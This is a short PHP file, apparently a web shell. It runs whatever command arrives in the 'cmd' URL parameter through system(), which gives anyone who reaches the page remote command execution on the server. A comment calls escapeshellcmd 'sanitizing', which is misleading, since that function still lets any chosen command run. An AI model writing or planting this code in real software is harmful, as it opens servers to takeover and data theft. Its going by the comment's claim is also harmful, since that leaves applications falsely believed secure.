<?php
if (isset($_GET['cmd'])) {
    // Sanitize user input using escapeshellcmd
    $command = escapeshellcmd($_GET['cmd']);
    system($command);
}
?>
